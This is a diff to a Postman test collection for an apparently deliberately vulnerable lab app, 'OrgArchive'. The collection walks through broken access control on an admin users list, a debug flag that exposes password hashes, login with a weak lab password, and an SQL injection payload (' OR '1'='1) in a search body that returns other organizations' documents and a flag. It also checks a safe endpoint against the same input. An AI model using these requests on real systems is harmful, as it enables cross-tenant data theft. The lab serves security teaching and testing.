@@ -1,7 +1,7 @@
 {
   "info": {
     "name": "OrgArchive — signup to cross-organization document access",
-    "description": "Run the 11 requests in order. Sign up as a normal user, use CVE 1 to read the admin-only users list, then search documents as Anna. Anna’s weak lab password is already set in annaPassword.",
+    "description": "Run the 10 requests in order. Sign up as a normal user, use CVE 1 to read the admin-only users list, then search documents as Anna. Anna’s weak lab password is already set in annaPassword.",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "variable": [
@@ -18,7 +18,7 @@
       "value": ""
     },
     {
-      "key": "userOrganization",
+      "key": "userOrganizationUuid",
       "value": ""
     },
     {
@@ -46,7 +46,7 @@
               "pm.response.to.have.status(200);",
               "const api = pm.response.json();",
               "pm.expect(api.service).to.equal('OrgArchive');",
-              "['/signup','/users','/notes','/organizations/{organization}/notes','/documents/search'].forEach(path => pm.expect(api.endpoints.some(e => e.path === path)).to.be.true);"
+              "['/signup','/users','/organizations','/documents/search'].forEach(path => pm.expect(api.endpoints.some(e => e.path === path)).to.be.true);"
             ]
           }
         }
@@ -75,29 +75,7 @@
       ]
     },
     {
-      "name": "3 · Anonymous /notes → 401",
-      "request": {
-        "method": "GET",
-        "url": "{{gatewayUrl}}/notes",
-        "description": "",
-        "auth": {
-          "type": "noauth"
-        }
-      },
-      "event": [
-        {
-          "listen": "test",
-          "script": {
-            "type": "text/javascript",
-            "exec": [
-              "pm.response.to.have.status(401);"
-            ]
-          }
-        }
-      ]
-    },
-    {
-      "name": "4 · Sign up as a normal user",
+      "name": "3 · Sign up as a normal user",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/signup",
@@ -141,19 +119,19 @@
               "pm.response.to.have.status(201);",
               "const account = pm.response.json();",
               "pm.expect(account.username).to.equal(pm.collectionVariables.get('username'));",
-              "pm.expect(account.organization).to.match(/^trial-/);",
-              "pm.collectionVariables.set('userOrganization', account.organization);"
+              "pm.expect(account.organizationUuid).to.match(/^[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}$/);",
+              "pm.collectionVariables.set('userOrganizationUuid', account.organizationUuid);"
             ]
           }
         }
       ]
     },
     {
-      "name": "5 · My organization notes → empty",
+      "name": "4 · My organization documents → empty",
       "request": {
-        "method": "GET",
-        "url": "{{gatewayUrl}}/organizations/{{userOrganization}}/notes",
-        "description": "",
+        "method": "POST",
+        "url": "{{gatewayUrl}}/documents/search",
+        "description": "The newly registered organization has no documents yet.",
         "auth": {
           "type": "basic",
           "basic": [
@@ -168,6 +146,21 @@
               "type": "string"
             }
           ]
+        },
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"organizationUuid\": \"{{userOrganizationUuid}}\"\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
         }
       },
       "event": [
@@ -184,7 +177,7 @@
       ]
     },
     {
-      "name": "6 · CVE 1 · Normal user accesses admin /users",
+      "name": "5 · CVE 1 · Normal user accesses admin /users",
       "request": {
         "method": "GET",
         "url": "{{gatewayUrl}}/users",
@@ -217,15 +210,15 @@
               "pm.expect(users.length).to.be.above(0);",
               "pm.expect(users.some(u => u.username === 'anna')).to.be.true;",
               "pm.expect(users.some(u => u.role === 'admin')).to.be.true;",
-              "pm.expect(users.find(u => u.username === 'anna').organization).to.equal('atlas-consulting');",
-              "pm.expect(users.some(u => u.organization === 'harbor-delivery')).to.be.true;"
+              "pm.expect(users.find(u => u.username === 'anna').organizationUuid).to.equal('786298a5-8c02-56ce-ba8f-d2b41ec3333c');",
+              "pm.expect(users.some(u => u.organizationUuid === '1ae53893-c399-57c3-ba32-16e55b435249')).to.be.true;"
             ]
           }
         }
       ]
     },
     {
-      "name": "7 · Users with debug flag → password hashes",
+      "name": "6 · Users with debug flag → password hashes",
       "request": {
         "method": "GET",
         "url": "{{gatewayUrl}}/users?debug=true",
@@ -262,7 +255,7 @@
       ]
     },
     {
-      "name": "8 · Anna document search → own organization",
+      "name": "7 · Anna document search → own organization",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -290,7 +283,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organization\": \"atlas-consulting\"\n}",
+          "raw": "{\n  \"organizationUuid\": \"786298a5-8c02-56ce-ba8f-d2b41ec3333c\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -307,14 +300,14 @@
               "pm.response.to.have.status(200);",
               "const docs = pm.response.json();",
               "pm.expect(docs.length).to.be.above(0);",
-              "pm.expect(docs.every(d => JSON.parse(d.metadata).organization === 'atlas-consulting')).to.be.true;"
+              "pm.expect(docs.every(d => JSON.parse(d.metadata).organizationUuid === '786298a5-8c02-56ce-ba8f-d2b41ec3333c')).to.be.true;"
             ]
           }
         }
       ]
     },
     {
-      "name": "9 · Anna searches another organization → empty",
+      "name": "8 · Anna searches another organization → empty",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -342,7 +335,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organization\": \"harbor-delivery\"\n}",
+          "raw": "{\n  \"organizationUuid\": \"1ae53893-c399-57c3-ba32-16e55b435249\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -364,7 +357,7 @@
       ]
     },
     {
-      "name": "10 · CVE 2 · SQL injection reveals all organizations",
+      "name": "9 · CVE 2 · SQL injection reveals all organizations",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -392,7 +385,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
+          "raw": "{\n  \"organizationUuid\": \"786298a5-8c02-56ce-ba8f-d2b41ec3333c' OR '1'='1\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -407,8 +400,8 @@
             "type": "text/javascript",
             "exec": [
               "pm.response.to.have.status(200);",
-              "const organizations = new Set(pm.response.json().map(d => JSON.parse(d.metadata).organization));",
-              "['atlas-consulting','harbor-delivery','cedar-partners','siteworks-group','meridian-legal'].forEach(o => pm.expect(organizations.has(o)).to.be.true);",
+              "const organizations = new Set(pm.response.json().map(d => JSON.parse(d.metadata).organizationUuid));",
+              "['786298a5-8c02-56ce-ba8f-d2b41ec3333c','1ae53893-c399-57c3-ba32-16e55b435249','aa2262cf-c84c-5f89-8853-dc9b2ebb4a7b','768fc845-aff9-5b32-b626-a8f05a8778d2','d3302858-83b5-5ec5-aba6-1f7c9da45bd0'].forEach(o => pm.expect(organizations.has(o)).to.be.true);",
               "pm.expect(pm.response.text()).to.include('FLAG{archive-isolation-broken-by-converter}');"
             ]
           }
@@ -416,7 +409,7 @@
       ]
     },
     {
-      "name": "11 · Safe search with the same input → empty",
+      "name": "10 · Safe search with the same input → empty",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search-safe",
@@ -444,7 +437,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
+          "raw": "{\n  \"organizationUuid\": \"786298a5-8c02-56ce-ba8f-d2b41ec3333c' OR '1'='1\"\n}",
           "options": {
             "raw": {
               "language": "json"
